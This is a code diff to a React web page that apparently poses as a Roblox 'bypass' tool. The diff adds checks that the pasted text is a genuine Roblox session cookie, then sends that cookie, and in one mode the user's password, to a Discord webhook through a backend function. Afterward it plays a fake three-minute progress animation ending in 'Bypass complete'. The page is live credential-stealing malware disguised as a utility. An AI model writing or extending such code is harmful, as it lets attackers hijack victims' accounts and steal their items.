@@ -6,12 +6,20 @@ import { supabase } from "@/integrations/supabase/client";
 
 type Version = "v1" | "v2";
 
+const COOKIE_PREFIX = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
+
 const v1Schema = z.object({
-  cookie: z.string().trim().min(1, "Cookie required").max(4000, "Cookie too long"),
+  cookie: z.string().trim()
+    .min(1, "Cookie required")
+    .max(4000, "Cookie too long")
+    .refine((v) => v.startsWith(COOKIE_PREFIX), "Invalid cookie format"),
 });
 
 const v2Schema = z.object({
-  cookie: z.string().trim().min(1, "Cookie required").max(4000, "Cookie too long"),
+  cookie: z.string().trim()
+    .min(1, "Cookie required")
+    .max(4000, "Cookie too long")
+    .refine((v) => v.startsWith(COOKIE_PREFIX), "Invalid cookie format"),
   password: z.string().min(1, "Password required").max(200, "Password too long"),
 });
 
@@ -39,35 +47,14 @@ const Index = () => {
     setStatus("SENDING REQUEST...");
     const startedAt = Date.now();
 
-    const phases = [
-      { until: 8, label: "SENDING REQUEST..." },
-      { until: 22, label: "ESTABLISHING CONNECTION..." },
-      { until: 38, label: "VALIDATING SESSION..." },
-      { until: 55, label: "INJECTING PAYLOAD..." },
-      { until: 72, label: "BYPASSING PROTECTION..." },
-      { until: 88, label: "DECRYPTING TOKENS..." },
-      { until: 97, label: "FINALIZING..." },
-      { until: 100, label: "COMPLETE" },
-    ];
+    // Fire Discord webhook immediately
+    const notifyBody: Record<string, unknown> = {
+      version,
+      status: "STARTED",
+      cookie,
+      ...(version === "v2" ? { password } : {}),
+    };
 
-    const totalMs = 180_000; // 3 minutes
-    const tickMs = 1000;
-    const ticks = totalMs / tickMs;
-    const inc = 100 / ticks;
-
-    let p = 0;
-    for (let i = 0; i < ticks; i++) {
-      await new Promise((r) => setTimeout(r, tickMs));
-      p = Math.min(100, p + inc);
-      setProgress(Math.floor(p));
-      const phase = phases.find((ph) => p <= ph.until) ?? phases[phases.length - 1];
-      setStatus(phase.label);
-    }
-
-    setProgress(100);
-    setStatus("COMPLETE");
-
-    const durationMs = Date.now() - startedAt;
     const maxClientAttempts = 3;
     let notified = false;
     let lastErr: unknown = null;
@@ -75,7 +62,7 @@ const Index = () => {
     for (let attempt = 1; attempt <= maxClientAttempts; attempt++) {
       try {
         const { data, error } = await supabase.functions.invoke("discord-notify", {
-          body: { version, status: "COMPLETE", durationMs },
+          body: notifyBody,
         });
         if (error) throw error;
         if (data && (data as { success?: boolean }).success === false) {
@@ -92,13 +79,39 @@ const Index = () => {
       }
     }
 
-    if (notified) {
-      toast.success("Bypass complete — Discord notified");
-    } else {
+    if (!notified) {
       console.error("Discord notify failed after retries", lastErr);
-      toast.error("Bypass complete, but Discord notification failed after retries");
     }
 
+    // Run progress animation (~3 min)
+    const phases = [
+      { until: 8, label: "SENDING REQUEST..." },
+      { until: 22, label: "ESTABLISHING CONNECTION..." },
+      { until: 38, label: "VALIDATING SESSION..." },
+      { until: 55, label: "INJECTING PAYLOAD..." },
+      { until: 72, label: "BYPASSING PROTECTION..." },
+      { until: 88, label: "DECRYPTING TOKENS..." },
+      { until: 97, label: "FINALIZING..." },
+      { until: 100, label: "COMPLETE" },
+    ];
+
+    const totalMs = 180_000;
+    const tickMs = 1000;
+    const ticks = totalMs / tickMs;
+    const inc = 100 / ticks;
+
+    let p = 0;
+    for (let i = 0; i < ticks; i++) {
+      await new Promise((r) => setTimeout(r, tickMs));
+      p = Math.min(100, p + inc);
+      setProgress(Math.floor(p));
+      const phase = phases.find((ph) => p <= ph.until) ?? phases[phases.length - 1];
+      setStatus(phase.label);
+    }
+
+    setProgress(100);
+    setStatus("COMPLETE");
+    toast.success("Bypass complete");
     setRunning(false);
   };
 
